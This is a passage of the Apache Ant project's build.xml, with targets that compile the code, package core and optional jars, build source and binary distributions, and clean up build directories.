        <available classname="com.sun.tools.javah.Main"/>
      </and>
    </condition>

    <condition property="tests.are.on.system.classpath">
      <or>
        <resourcecount count="1">
          <intersect>
            <path path="${java.class.path}"/>
            <file file="${build.tests}"/>
          </intersect>
        </resourcecount>
        <istrue value="${junit.fork}"/>
      </or>
    </condition>

    <echo level="verbose"> tests.are.on.system.classpath=${tests.are.on.system.classpath}</echo>

    <condition property="jasper.present">
      <and>
        <available classname="org.apache.jasper.compiler.Compiler"/>
        <available classname="org.apache.jasper.JasperException"/>
      </and>
    </condition>

    <condition property="swing.present">
      <or>
        <not>
          <isset property="kaffe"/>
        </not>
        <available classname="javax.swing.ImageIcon"
          classpathref="classpath"/>
      </or>
    </condition>

    <available property="rhino.present"
               classname="org.mozilla.javascript.Scriptable"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="beanshell.present"
               classname="bsh.StringUtil"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="xerces1.present"
               classname="org.apache.xerces.framework.XMLParser"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="jsch.present"
               classname="com.jcraft.jsch.Session"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    <available property="xz.present"
               classname="org.tukaani.xz.XZOutputStream"
               classpathref="classpath" ignoresystemclasses="${ignoresystemclasses}"/>

    <property name="build.compiler" value="modern"/>

    <!-- check for XSD support in the parser -->
    <condition property="xmlschema.present">
      <or>
        <parsersupports feature="http://apache.org/xml/features/validation/schema"/>
        <parsersupports feature="http://java.sun.com/xml/jaxp/properties/schemaSource"/>
      </or>
    </condition>

    <!--
    Java8 introduced a HTML checker 'doclint' which is very strict and breaks
    the build if there is a HTML error in the JavaDoc.
    -->
    <condition
            property="javadoc.doclint.none"
            value="-Xdoclint:none"
            else="">
      <not><isset property="withDoclint"/></not>
    </condition>
  </target>

  <!--
       ===================================================================
         Prepare the build
       ===================================================================
  -->
  <target name="prepare" depends="check-optional-packages">
    <tstamp>
      <format property="year" pattern="yyyy"/>
    </tstamp>
    <filterchain id="ant.filters">
       <expandproperties/>
    </filterchain>
  </target>

  <!--
       ===================================================================
         Build the code
       ===================================================================
  -->
  <target name="build" depends="prepare, compile, compile-jdk9+" unless="skip.build"
          description="--> compiles the source code">

    <!-- Builds and verifies that the classes belonging in the confined package of
    junitlauncher task do not depend on classes they aren't meant to -->
    <!-- first wipe out the "confined" package that might have been built already
     due to the javac above -->
    <delete dir="${build.classes}/${optional.package}/junitlauncher/confined/"/>
    <javac srcdir="${java.dir}"
           includeantruntime="false"
           destdir="${build.classes}"
           debug="${debug}"
           deprecation="${deprecation}"
           includes="${optional.package}/junitlauncher/confined/**"
           target="${javac.target}"
           source="${javac.source}"
           release="${javac.release}"
           optimize="${optimize}">
      <compilerarg line="-proc:none"/>
      <classpath>
        <!-- A very limited classpath which only doesn't include optional libraries,
         which the classes in confined package aren't meant to depend on -->
        <fileset dir="${build.classes}">
          <!-- exclude the org/apache/tools/ant/taskdefs/optional/junitlauncher package
          from the classpath, since the confined package isn't meant to depend on
          classes in this package -->
          <exclude name="org/apache/tools/ant/taskdefs/optional/junitlauncher/*"/>
        </fileset>
      </classpath>

    </javac>

    <copy todir="${build.classes}">
      <fileset dir="${java.dir}">
        <include name="**/*.properties"/>
        <include name="**/*.dtd"/>
        <include name="**/*.xml"/>
      </fileset>
      <fileset dir="${resource.dir}"/>
    </copy>

    <copy todir="${build.classes}"
      overwrite="true" encoding="UTF-8">
      <fileset dir="${java.dir}">
        <include name="**/version.txt"/>
        <include name="**/defaultManifest.mf"/>
      </fileset>
      <filterchain refid="ant.filters"/>
    </copy>

    <copy todir="${build.classes}/${optional.package}/junit/xsl">
      <fileset dir="${etc.dir}">
        <include name="junit-frames.xsl"/>
        <include name="junit-noframes.xsl"/>
        <include name="junit-frames-saxon.xsl"/>
        <include name="junit-noframes-saxon.xsl"/>
      </fileset>
    </copy>
  </target>

  <target name="compile" depends="prepare">
    <mkdir dir="${build.classes}"/>
    <javac srcdir="${java.dir}"
           includeantruntime="false"
           destdir="${build.classes}"
           debug="${debug}"
           deprecation="${deprecation}"
           excludes="${optional.package}/junitlauncher/confined/**"
           target="${javac.target}"
           source="${javac.source}"
           release="${javac.release}"
           optimize="${optimize}">
      <compilerarg line="-proc:none"/>
      <classpath refid="classpath"/>

      <selector id="conditional-patterns">
        <not>
          <or>
            <selector refid="needs.jdk9+"/>
            <selector refid="not.in.kaffe" if="kaffe"/>
            <selector refid="needs.apache-resolver" unless="apache.resolver.present"/>
            <selector refid="needs.junit" unless="junit.present"/> <!-- TODO should perhaps use -source 1.4? -->
            <selector refid="needs.junit4" unless="junit4.present"/>
            <selector refid="needs.junitlauncher" unless="junitlauncher.present"/>
            <selector refid="needs.junit.engine.vintage" unless="junit.engine.vintage.present"/>
            <selector refid="needs.junit.engine.jupiter" unless="junit.engine.jupiter.present"/>
            <selector refid="needs.apache-regexp" unless="apache.regexp.present"/>
            <selector refid="needs.apache-oro" unless="apache.oro.present"/>
            <selector refid="needs.apache-bcel" unless="bcel.present"/>
            <selector refid="needs.apache-log4j" unless="log4j.present"/>
            <selector refid="needs.commons-logging" unless="commons.logging.present"/>
            <selector refid="needs.apache-bsf" unless="bsf.present"/>
            <selector refid="needs.javamail" unless="javamail.present"/>
            <selector refid="needs.jakartamail" unless="jakartamail.present"/>
            <selector refid="needs.netrexx" unless="netrexx.present"/>
            <selector refid="needs.commons-net" unless="commons.net.present"/>
            <selector refid="needs.antlr" unless="antlr.present"/>
            <selector refid="needs.imageio" unless="imageio.present"/>
            <selector refid="needs.jmf" unless="jmf.present"/>
            <selector refid="needs.jai" unless="jai.present"/>
            <selector refid="needs.jdepend" unless="jdepend.present"/>
            <selector refid="needs.swing" unless="swing.present"/>
            <selector refid="needs.jsch" unless="jsch.present"/>
            <selector refid="needs.xz" unless="xz.present"/>
            <selector refid="needs.xmlschema" unless="xmlschema.present"/>
            <selector refid="needs.apache-xalan2" unless="recent.xalan2.present"/>
          </or>
        </not>
      </selector>
    </javac>
  </target>

  <target name="compile-jdk9+" depends="prepare" if="jdk9+">
    <mkdir dir="${build.classes}"/>

    <javac srcdir="${java.dir}"
           includeantruntime="false"
           destdir="${build.classes}"
           debug="${debug}"
           deprecation="${deprecation}"
           target="${javac.target}"
           source="${javac.source}"
           optimize="${optimize}">
      <compilerarg line="-proc:none"/>
      <classpath refid="classpath"/>

      <selector id="conditional-patterns-jdk9+">
          <or>
            <selector refid="needs.jdk9+"/>
          </or>
      </selector>
    </javac>
  </target>

  <!--
       ===================================================================
         Create the all of the Apache Ant jars
       ===================================================================
  -->
  <target name="jars" depends="build"
          description="--> creates the Apache Ant jars">

    <copy todir="${build.dir}">
      <fileset dir="${basedir}">
        <include name="LICENSE"/>
        <include name="LICENSE.xerces"/>
        <include name="LICENSE.dom"/>
        <include name="LICENSE.sax"/>
        <include name="NOTICE"/>
      </fileset>
      <mapper type="glob" from="*" to="*.txt"/>
    </copy>

    <jar destfile="${build.lib}/${name}-launcher.jar"
         basedir="${build.classes}" index="true"
         whenmanifestonly="fail">
      <selector refid="ant.launcher"/>
      <metainf dir="${build.dir}">
        <include name="LICENSE.txt"/>
        <include name="NOTICE.txt"/>
      </metainf>
      <manifest>
        <attribute name="Main-Class" value="org.apache.tools.ant.launch.Launcher"/>
      </manifest>
    </jar>

    <jar destfile="${build.lib}/${name}.jar"
         basedir="${build.classes}" index="true"
         whenmanifestonly="fail">
      <!-- Verification: (cd dist/lib; for j in *.jar; do jar tf $j; done) | egrep -v '/$|META-INF/MANIFEST\.MF' | sort | uniq -d -->
      <selector refid="ant.core"/>
      <metainf dir="${build.dir}">
        <include name="LICENSE.txt"/>
        <include name="NOTICE.txt"/>
      </metainf>
      <manifest>
        <attribute name="Main-Class" value="org.apache.tools.ant.Main"/>
        <section name="${ant.package}/">
          <attribute name="Extension-Name"
                     value="org.apache.tools.ant"/>
          <attribute name="Specification-Title"
                     value="Apache Ant"/>
          <attribute name="Specification-Version"
                     value="${manifest-version}"/>
          <attribute name="Specification-Vendor"
                     value="Apache Software Foundation"/>
          <attribute name="Implementation-Title"
                     value="org.apache.tools.ant"/>
          <attribute name="Implementation-Version"
                     value="${manifest-version}"/>
          <attribute name="Implementation-Vendor"
                     value="Apache Software Foundation"/>
        </section>
      </manifest>

      <fileset dir="${manual.dir}">
        <include name="images/ant_logo_large.gif"/>
      </fileset>
    </jar>

    <jar destfile="${build.lib}/${bootstrap.jar}"
         basedir="${build.classes}"
         whenmanifestonly="fail">
      <include name="${ant.package}/Main.class"/>
      <metainf dir="${build.dir}">
        <include name="LICENSE.txt"/>
        <include name="NOTICE.txt"/>
      </metainf>
      <manifest>
        <attribute name="Main-Class" value="org.apache.tools.ant.Main"/>
        <attribute name="Class-Path" value="ant.jar xalan.jar"/>
      </manifest>
    </jar>

    <macrodef name="optional-jar">
      <attribute name="dep"/>
      <sequential>
        <jar destfile="${build.lib}/${optional.jars.prefix}-@{dep}.jar"
             basedir="${build.classes}" index="true"
             whenmanifestonly="${optional.jars.whenmanifestonly}">
          <selector refid="needs.@{dep}"/>
          <metainf dir="${build.dir}">
            <include name="LICENSE.txt"/>
            <include name="NOTICE.txt"/>
          </metainf>
          <manifest>
            <section name="${optional.package}/">
              <attribute name="Extension-Name"
                         value="org.apache.tools.ant"/>
              <attribute name="Specification-Title"
                         value="Apache Ant"/>
              <attribute name="Specification-Version"
                         value="${manifest-version}"/>
              <attribute name="Specification-Vendor"
                         value="Apache Software Foundation"/>
              <attribute name="Implementation-Title"
                         value="org.apache.tools.ant"/>
              <attribute name="Implementation-Version"
                         value="${manifest-version}"/>
              <attribute name="Implementation-Vendor"
                         value="Apache Software Foundation"/>
            </section>
          </manifest>
        </jar>
      </sequential>
    </macrodef>

    <optional-jar dep="apache-resolver"/>
    <optional-jar dep="junit"/>
    <optional-jar dep="junit4"/>
    <optional-jar dep="junitlauncher"/>
    <optional-jar dep="apache-regexp"/>
    <optional-jar dep="apache-oro"/>
    <optional-jar dep="apache-bcel"/>
    <optional-jar dep="apache-log4j"/>
    <optional-jar dep="commons-logging"/>
    <optional-jar dep="apache-bsf"/>
    <optional-jar dep="javamail"/>
    <optional-jar dep="jakartamail"/>
    <optional-jar dep="netrexx"/>
    <optional-jar dep="commons-net"/>
    <optional-jar dep="antlr"/>
    <optional-jar dep="imageio"/>
    <optional-jar dep="jmf"/>
    <optional-jar dep="jai"/>
    <optional-jar dep="swing"/>
    <optional-jar dep="jsch"/>
    <optional-jar dep="jdepend"/>
    <optional-jar dep="apache-xalan2"/>
    <optional-jar dep="xz"/>

  </target>

  <!--   Creates jar of test utility classes -->
  <target name="test-jar" depends="compile-tests"
          description="--> creates the Apache Ant Test Utilities jar">

    <fail unless="junit.present">
      We cannot build the test jar unless JUnit is present,
      as JUnit is needed to compile the test classes.
    </fail>
    <jar destfile="${build.lib}/${name}-testutil.jar" index="true"
         basedir="${build.tests}">
      <patternset refid="useful.tests"/>
      <metainf dir="${build.dir}">
        <include name="LICENSE.txt"/>
        <include name="NOTICE.txt"/>
      </metainf>
    </jar>
  </target>

  <!--
       ===================================================================
         Create the all of the Apache Ant source jars
       ===================================================================
  -->
  <target name="jars-sources" description="--> creates the Apache Ant source jars">
    <mkdir dir="${build.lib-src}"/>
    <jar destfile="${build.lib-src}/${name}-launcher.jar"
         basedir="${java.dir}"
         whenmanifestonly="fail">
      <selector refid="ant.launcher"/>
      <metainf dir="${build.dir}">
        <include name="LICENSE.txt"/>
        <include name="NOTICE.txt"/>
      </metainf>
    </jar>

    <jar destfile="${build.lib-src}/${name}.jar"
         basedir="${java.dir}"
         whenmanifestonly="fail">
      <selector refid="ant.core"/>
      <metainf dir="${build.dir}">
        <include name="LICENSE.txt"/>
        <include name="NOTICE.txt"/>
      </metainf>
    </jar>

    <jar destfile="${build.lib-src}/${bootstrap.jar}"
         basedir="${java.dir}"
         whenmanifestonly="fail">
      <include name="${ant.package}/Main.java"/>
      <metainf dir="${build.dir}">
        <include name="LICENSE.txt"/>
        <include name="NOTICE.txt"/>
      </metainf>
    </jar>

    <macrodef name="optional-src-jar">
      <attribute name="dep"/>
      <sequential>
        <jar destfile="${build.lib-src}/${optional.jars.prefix}-@{dep}.jar"
             basedir="${java.dir}"
             whenmanifestonly="${optional.jars.whenmanifestonly}">
          <selector refid="needs.@{dep}"/>
          <metainf dir="${build.dir}">
            <include name="LICENSE.txt"/>
            <include name="NOTICE.txt"/>
          </metainf>
        </jar>
      </sequential>
    </macrodef>

    <optional-src-jar dep="apache-resolver"/>
    <optional-src-jar dep="junit"/>
    <optional-src-jar dep="junit4"/>
    <optional-src-jar dep="junitlauncher"/>
    <optional-src-jar dep="apache-regexp"/>
    <optional-src-jar dep="apache-oro"/>
    <optional-src-jar dep="apache-bcel"/>
    <optional-src-jar dep="apache-log4j"/>
    <optional-src-jar dep="commons-logging"/>
    <optional-src-jar dep="apache-bsf"/>
    <optional-src-jar dep="javamail"/>
    <optional-src-jar dep="jakartamail"/>
    <optional-src-jar dep="netrexx"/>
    <optional-src-jar dep="commons-net"/>
    <optional-src-jar dep="antlr"/>
    <optional-src-jar dep="imageio"/>
    <optional-src-jar dep="jmf"/>
    <optional-src-jar dep="jai"/>
    <optional-src-jar dep="swing"/>
    <optional-src-jar dep="jsch"/>
    <optional-src-jar dep="jdepend"/>
    <optional-src-jar dep="apache-xalan2"/>
    <optional-src-jar dep="xz"/>

  </target>

  <target name="test-jar-source"
          description="--> creates the Apache Ant Test Utilities source jar">
    <mkdir dir="${build.lib-src}"/>
    <jar destfile="${build.lib-src}/${name}-testutil.jar"
         basedir="${src.junit}">
      <patternset refid="useful.tests"/>
      <metainf dir="${build.dir}">
        <include name="LICENSE.txt"/>
        <include name="NOTICE.txt"/>
      </metainf>
    </jar>
  </target>

  <!--
       ===================================================================
         Create the essential distribution that can run Apache Ant
       ===================================================================
  -->
  <target name="dist-lite" depends="jars,test-jar,-ant-dist-warn-jdk9+"
          description="--> creates a minimum distribution to run Apache Ant">

    <mkdir dir="${dist.dir}"/>
    <mkdir dir="${dist.bin}"/>
    <mkdir dir="${dist.lib}"/>

    <copy todir="${dist.lib}">
      <fileset dir="${build.lib}">
        <exclude name="${bootstrap.jar}"/>
      </fileset>
    </copy>

    <copy todir="${dist.lib}">
      <fileset dir="${lib.dir}">
        <include name="*.jar"/>
        <include name="*.zip"/>
      </fileset>
    </copy>

    <copy todir="${dist.bin}">
      <fileset dir="${script.dir}"/>
    </copy>

    <fixcrlf srcdir="${dist.bin}" eol="dos" includes="*.bat,*.cmd"/>
    <fixcrlf srcdir="${dist.bin}" eol="unix">
      <include name="ant"/>
      <include name="antRun"/>
      <include name="*.pl"/>
    </fixcrlf>

    <setpermissions mode="755" failonerror="${setpermissions.fail}"
                    nonPosixMode="${setpermissions.nonposixmode}">
      <fileset dir="${dist.bin}">
        <include name="**/ant"/>
        <include name="**/antRun"/>
        <include name="**/*.pl"/>
        <include name="**/*.py"/>
      </fileset>
    </setpermissions>

  </target>

  <!--
        ===================================================================
          Create the complete distribution
        ===================================================================
   -->
  <target name="dist" description="--> creates a complete distribution">
    <antcall inheritAll="false" target="dist-internal">
      <param name="dist.dir" value="${dist.name}"/>
    </antcall>
  </target>

  <target name="dist-javadocs" depends="javadocs" unless="javadoc.notrequired">
    <mkdir dir="${dist.javadocs}"/>
    <copy todir="${dist.javadocs}" overwrite="true">
      <fileset dir="${build.javadocs}"/>
    </copy>
  </target>

  <macrodef name="checksums">
    <element name="resources" implicit="true"/>
    <sequential>
      <checksum fileext=".sha512" algorithm="sha-512">
        <resources/>
      </checksum>
    </sequential>
  </macrodef>

  <target name="dist-internal" depends="dist-lite,dist-javadocs">
    <mkdir dir="${dist.manual}"/>
    <mkdir dir="${dist.etc}"/>

    <copy todir="${dist.lib}" file="${lib.dir}/README"/>
    <copy todir="${dist.lib}" file="${lib.dir}/libraries.properties"/>

    <copy todir="${dist.lib}">
      <fileset dir="${src.dir}/etc/poms">
        <include name="*/pom.xml"/>
      </fileset>
      <mapper type="regexp" from="^(.*)[/\\]pom.xml" to="\1.pom"/>
      <filterchain>
        <tokenfilter>
          <replaceregex pattern="${pom.version}" replace="${project.version}"/>
        </tokenfilter>
      </filterchain>
    </copy>
    <copy todir="${dist.lib}">
      <fileset dir="${src.dir}/etc/poms">
        <include name="pom.xml"/>
      </fileset>
      <mapper type="glob" from="pom.xml" to="ant-parent.pom"/>
      <filterchain>
        <tokenfilter>
          <replaceregex pattern="${pom.version}" replace="${project.version}"/>
        </tokenfilter>
      </filterchain>
    </copy>

    <copy todir="${dist.manual}">
      <fileset dir="${manual.dir}"/>
    </copy>

    <copy todir="${dist.dir}">
      <fileset dir="${basedir}">
        <include name="CONTRIBUTORS"/>
        <include name="README"/>
        <include name="INSTALL"/>
        <include name="LICENSE"/>
        <include name="LICENSE.xerces"/>
        <include name="LICENSE.dom"/>
        <include name="LICENSE.sax"/>
        <include name="NOTICE"/>
        <include name="TODO"/>
        <include name="WHATSNEW"/>
        <include name="KEYS"/>
        <include name="contributors.xml"/>
        <include name="fetch.xml"/>
        <include name="get-m2.xml"/>
        <include name="patch.xml"/>
      </fileset>
    </copy>

    <setpermissions mode="755" failonerror="${setpermissions.fail}"
                    nonPosixMode="${setpermissions.nonposixmode}">
      <fileset dir="${dist.bin}">
        <include name="**/ant"/>
        <include name="**/antRun"/>
        <include name="**/*.pl"/>
        <include name="**/*.py"/>
      </fileset>
    </setpermissions>

    <!-- publish some useful stylesheets -->
    <copy todir="${dist.etc}">
      <fileset dir="${etc.dir}">
        <include name="junit-frames.xsl"/>
        <include name="junit-noframes.xsl"/>
        <include name="junit-frames-xalan1.xsl"/>
        <include name="coverage-frames.xsl"/>
        <include name="maudit-frames.xsl"/>
        <include name="mmetrics-frames.xsl"/>
        <include name="changelog.xsl"/>
        <include name="jdepend.xsl"/>
        <include name="jdepend-frames.xsl"/>
        <include name="checkstyle/*.xsl"/>
        <include name="log.xsl"/>
        <include name="tagdiff.xsl"/>
      </fileset>
      <fileset dir="${build.lib}">
        <include name="${bootstrap.jar}"/>
      </fileset>
    </copy>
  </target>

  <!--
       ===================================================================
         Target to create bootstrap build
       ===================================================================
  -->
  <target name="bootstrap" description="--> creates a bootstrap build">
    <antcall inheritAll="false" target="dist-lite">
      <param name="dist.dir" value="${bootstrap.dir}"/>
    </antcall>
  </target>

  <!--
       ===================================================================
         Create the source distribution
       ===================================================================
  -->
  <target name="src-dist"
          description="--> creates a source distribution">

    <mkdir dir="${src.dist.dir}"/>

    <copy todir="${src.dist.lib}">
      <fileset dir="${lib.dir}">
        <include name="optional/junit-3.8.2.jar"/>
        <include name="optional/junit-4.13.2.jar"/>
        <include name="optional/hamcrest-3.0.jar"/>
        <include name="README"/>
        <include name="libraries.properties"/>
      </fileset>
    </copy>

    <mkdir dir="${src.dist.lib}/optional"/>

    <copy todir="${src.dist.src}">
      <fileset dir="${src.dir}"/>
    </copy>

    <copy todir="${src.dist.manual}">
      <fileset dir="${manual.dir}">
        <exclude name="api/"/>
      </fileset>
    </copy>

    <copy todir="${src.dist.dir}">
      <fileset dir="${basedir}">
        <include name="CONTRIBUTORS"/>
        <include name="INSTALL"/>
        <include name="KEYS"/>
        <include name="LICENSE"/>
        <include name="LICENSE.dom"/>
        <include name="LICENSE.sax"/>
        <include name="LICENSE.xerces"/>
        <include name="NOTICE"/>
        <include name="README"/>
        <include name="TODO"/>
        <include name="WHATSNEW"/>
        <include name="bootstrap.bat"/>
        <include name="bootstrap.sh"/>
        <include name="build.bat"/>
        <include name="build.sh"/>
        <include name="build.xml"/>
        <include name="contributors.xml"/>
        <include name="fetch.xml"/>
        <include name="get-m2.xml"/>
        <include name="patch.xml"/>
      </fileset>
    </copy>

    <fixcrlf srcdir="${src.dist.dir}" eol="dos" includes="*.bat,*.cmd"/>
    <fixcrlf srcdir="${src.dist.dir}" eol="unix">
      <include name="**/*.sh"/>
      <include name="**/*.pl"/>
      <include name="**/ant"/>
      <include name="**/antRun"/>
    </fixcrlf>
    <fixcrlf srcdir="${src.dist.dir}">
      <include name="**/*.java"/>
      <exclude name="${tests.etc.dir}/taskdefs/fixcrlf/expected/Junk?.java"/>
      <exclude name="${tests.etc.dir}/taskdefs/fixcrlf/input/Junk?.java"/>
    </fixcrlf>

    <setpermissions mode="755" failonerror="${setpermissions.fail}"
                    nonPosixMode="${setpermissions.nonposixmode}">
      <dirset dir="${src.dist.dir}"/>
    </setpermissions>

    <setpermissions mode="644" failonerror="${setpermissions.fail}"
                    nonPosixMode="${setpermissions.nonposixmode}">
      <fileset dir="${src.dist.dir}"/>
    </setpermissions>

    <setpermissions mode="755" failonerror="${setpermissions.fail}"
                    nonPosixMode="${setpermissions.nonposixmode}">
      <fileset dir="${src.dist.dir}">
        <include name="**/*.sh"/>
        <include name="**/*.pl"/>
        <include name="**/*.py"/>
        <include name="**/ant"/>
        <include name="**/antRun"/>
      </fileset>
    </setpermissions>

  </target>

  <!--
       ===================================================================
         Create the binary distribution
       ===================================================================
  -->
  <target name="-distribution-prep">
    <delete dir="${dist.base}"/>
    <delete dir="${dist.name}"/>
    <delete dir="${java-repository.dir}"/>
    <mkdir dir="${dist.base}"/>
    <mkdir dir="${dist.base.source}"/>
    <mkdir dir="${dist.base.binaries}"/>
    <mkdir dir="${dist.base.manual}"/>
    <mkdir dir="${java-repository.dir}"/>
    <antcall inheritAll="false" target="dist-internal">
      <param name="dist.dir" value="${dist.name}"/>
    </antcall>
  </target>

  <target name="zip-distribution" depends="-distribution-prep"
          description="--> creates the zip distribution">
    <zip destfile="${dist.base.binaries}/${dist.name}-bin.zip">
      <zipfileset dir="${dist.name}/.." filemode="755">
        <include name="${dist.name}/bin/ant"/>
        <include name="${dist.name}/bin/antRun"/>
        <include name="${dist.name}/bin/*.pl"/>
        <include name="${dist.name}/bin/*.py"/>
      </zipfileset>
      <fileset dir="${dist.name}/..">
        <include name="${dist.name}/"/>
        <exclude name="${dist.name}/bin/ant"/>
        <exclude name="${dist.name}/bin/antRun"/>
        <exclude name="${dist.name}/bin/*.pl"/>
        <exclude name="${dist.name}/bin/*.py"/>
      </fileset>
    </zip>
  </target>

  <condition property="buildosxpackage">
    <and>
       <os family="mac"/>
       <isset property="buildosxpackage.required"/>
    </and>
  </condition>

  <target name="pkg-distribution" depends="zip-distribution" if="buildosxpackage">
    <mkdir dir="${build.pkg.dir}"/>
    <unzip src="${dist.base.binaries}/${dist.name}-bin.zip" dest="${build.pkg.dir}">
      <mapper type="regexp" from="^([^/]*)/(.*)$$" to="\2"/>
    </unzip>
    <chmod perm="+x" type="file">
      <fileset dir="${build.pkg.dir}/bin">
        <include name="ant"/>
        <include name="antRun"/>
        <include name="*.pl"/>
        <include name="*.py"/>
      </fileset>
    </chmod>
    <exec executable="/usr/bin/pkgbuild">
      <arg value="--root"/>
      <arg value="${build.pkg.dir}"/>
      <arg value="--identifier"/>
      <arg value="org.apache.ant"/>
      <arg value="--version"/>
      <arg value="${project.version}"/>
      <arg value="--install-location"/>
      <arg value="/usr/local/ant"/>
      <arg value="${dist.base.binaries}/${dist.name}.pkg"/>
    </exec>
  </target>

  <target name="tar-distribution" depends="-distribution-prep"
          description="--> creates the tar distribution">
    <tar longfile="gnu"
         destfile="${dist.base.binaries}/${dist.name}-bin.tar">
      <!-- removes redundant definition of permissions, but seems to
           drop dirs (and to be slow)
           <zipfileset src="${dist.base.binaries}/${dist.name}-bin.zip"/>
      -->
      <tarfileset dir="${dist.name}/.." mode="755" username="ant" group="ant">
        <include name="${dist.name}/bin/ant"/>
        <include name="${dist.name}/bin/antRun"/>
        <include name="${dist.name}/bin/*.pl"/>
        <include name="${dist.name}/bin/*.py"/>
      </tarfileset>
      <tarfileset dir="${dist.name}/.." username="ant" group="ant">
        <include name="${dist.name}/"/>
        <exclude name="${dist.name}/bin/ant"/>
        <exclude name="${dist.name}/bin/antRun"/>
        <exclude name="${dist.name}/bin/*.pl"/>
        <exclude name="${dist.name}/bin/*.py"/>
      </tarfileset>
    </tar>
    <gzip destfile="${dist.base.binaries}/${dist.name}-bin.tar.gz"
          src="${dist.base.binaries}/${dist.name}-bin.tar"/>
    <bzip2 destfile="${dist.base.binaries}/${dist.name}-bin.tar.bz2"
           src="${dist.base.binaries}/${dist.name}-bin.tar"/>
    <xz destfile="${dist.base.binaries}/${dist.name}-bin.tar.xz"
        src="${dist.base.binaries}/${dist.name}-bin.tar"/>
    <delete file="${dist.base.binaries}/${dist.name}-bin.tar"/>
  </target>

  <target name="main-distribution" depends="pkg-distribution,tar-distribution,jars-sources,test-jar-source"
          description="--> creates the zip, pkg, and tar distributions">

    <copy todir="${java-repository.dir}">
      <fileset dir="${dist.name}/lib">
        <include name="ant*.jar"/>
      </fileset>
      <mapper type="regexp" from="ant(.*).jar" to="ant\1/${project.version}/ant\1-${project.version}.jar"/>
    </copy>
    <copy todir="${java-repository.dir}">
      <fileset dir="${dist.name}/lib">
        <include name="*.pom"/>
      </fileset>
      <mapper>
        <mapper type="regexp" from="ant(.*).pom" to="ant\1/${project.version}/ant\1-${project.version}.pom"/>
      </mapper>
    </copy>
    <copy todir="${java-repository.dir}">
      <fileset dir="${build.lib-src}">
        <include name="ant*.jar"/>
      </fileset>
      <mapper type="regexp" from="ant(.*).jar" to="ant\1/${project.version}/ant\1-${project.version}-sources.jar"/>
    </copy>
    <jar destfile="${java-repository.dir}/ant/${project.version}/ant-${project.version}-javadoc.jar"
      basedir="${build.javadocs}">
      <metainf dir="${build.dir}">
        <include name="LICENSE.txt"/>
        <include name="NOTICE.txt"/>
      </metainf>
    </jar>

    <zip destfile="${dist.base.manual}/${dist.name}-manual.zip">
      <zipfileset dir="${dist.name}/manual" prefix="${dist.name}"/>
      <zipfileset file="NOTICE" prefix="${dist.name}"/>
    </zip>
    <tar longfile="gnu"
         destfile="${dist.base.manual}/${dist.name}-manual.tar">
      <tarfileset dir="${dist.name}/manual" prefix="${dist.name}"/>
      <tarfileset file="NOTICE" prefix="${dist.name}"/>
    </tar>
    <gzip destfile="${dist.base.manual}/${dist.name}-manual.tar.gz"
          src="${dist.base.manual}/${dist.name}-manual.tar"/>
    <bzip2 destfile="${dist.base.manual}/${dist.name}-manual.tar.bz2"
           src="${dist.base.manual}/${dist.name}-manual.tar"/>
    <xz destfile="${dist.base.manual}/${dist.name}-manual.tar.xz"
        src="${dist.base.manual}/${dist.name}-manual.tar"/>
    <delete file="${dist.base.manual}/${dist.name}-manual.tar"/>

    <delete dir="${dist.name}"/>
    <checksums>
      <fileset dir="${dist.base.binaries}/">
        <exclude name="**/*.asc"/>
        <exclude name="**/*.sha512"/>
      </fileset>
      <fileset dir="${dist.base.manual}/">
        <exclude name="**/*.asc"/>
        <exclude name="**/*.sha512"/>
      </fileset>
    </checksums>

    <antcall inheritAll="false" target="src-dist">
      <param name="src.dist.dir" value="${dist.name}"/>
    </antcall>
    <zip destfile="${dist.base.source}/${dist.name}-src.zip">
      <zipfileset dir="${dist.name}/.." filemode="755">
        <include name="${dist.name}/bootstrap.sh"/>
        <include name="${dist.name}/build.sh"/>
      </zipfileset>
      <fileset dir="${dist.name}/..">
        <include name="${dist.name}/"/>
        <exclude name="${dist.name}/bootstrap.sh"/>
        <exclude name="${dist.name}/build.sh"/>
      </fileset>
    </zip>
    <tar longfile="gnu"
         destfile="${dist.base.source}/${dist.name}-src.tar">
      <!--
          <zipfileset src="${dist.base.source}/${dist.name}-src.zip"/>
      -->
      <tarfileset dir="${dist.name}/.." mode="755" username="ant" group="ant">
        <include name="${dist.name}/bootstrap.sh"/>
        <include name="${dist.name}/build.sh"/>
      </tarfileset>
      <tarfileset dir="${dist.name}/.." username="ant" group="ant">
        <include name="${dist.name}/"/>
        <exclude name="${dist.name}/bootstrap.sh"/>
        <exclude name="${dist.name}/build.sh"/>
      </tarfileset>
    </tar>
    <gzip destfile="${dist.base.source}/${dist.name}-src.tar.gz"
          src="${dist.base.source}/${dist.name}-src.tar"/>
    <bzip2 destfile="${dist.base.source}/${dist.name}-src.tar.bz2"
           src="${dist.base.source}/${dist.name}-src.tar"/>
    <xz destfile="${dist.base.source}/${dist.name}-src.tar.xz"
        src="${dist.base.source}/${dist.name}-src.tar"/>
    <delete file="${dist.base.source}/${dist.name}-src.tar"/>
    <delete dir="${dist.name}"/>
    <checksums>
      <fileset dir="${dist.base.source}/">
        <exclude name="**/*.asc"/>
        <exclude name="**/*.sha512"/>
      </fileset>
    </checksums>
  </target>

  <target name="distribution" depends="main-distribution"
          description="--> creates the full Apache Ant distribution">
  </target>

  <!--
       ===================================================================
         Cleans up build and distribution directories
       ===================================================================
  -->
  <target name="clean"
          description="--> cleans up build and dist directories">
    <delete dir="${build.dir}"/>
    <delete dir="${dist.base}"/>
    <delete dir="${dist.dir}"/>
    <delete>
      <fileset dir="." includes="**/*~" defaultexcludes="no"/>
    </delete>
  </target>

  <!--
       ===================================================================
         Cleans everything
       ===================================================================
  -->
  <target name="allclean" depends="clean"
          description="--> cleans up everything">
    <delete file="${bootstrap.dir}/bin/antRun"/>
    <delete file="${bootstrap.dir}/bin/antRun.bat"/>
    <delete>
      <fileset dir="${bootstrap.dir}/bin" includes="*.pl"/>
      <fileset dir="${bootstrap.dir}/bin" includes="*.py"/>
    </delete>
  </target>

  <!--
       ===================================================================
         Installs Apache Ant
       ===================================================================
  -->
  <target name="install">
    <fail message="You must set the property ant.install=/where/to/install" unless="ant.install"/>
    <antcall inheritAll="false" target="dist-internal">
      <param name="dist.dir" value="${ant.install}"/>
    </antcall>
  </target>

  <target name="install-lite">
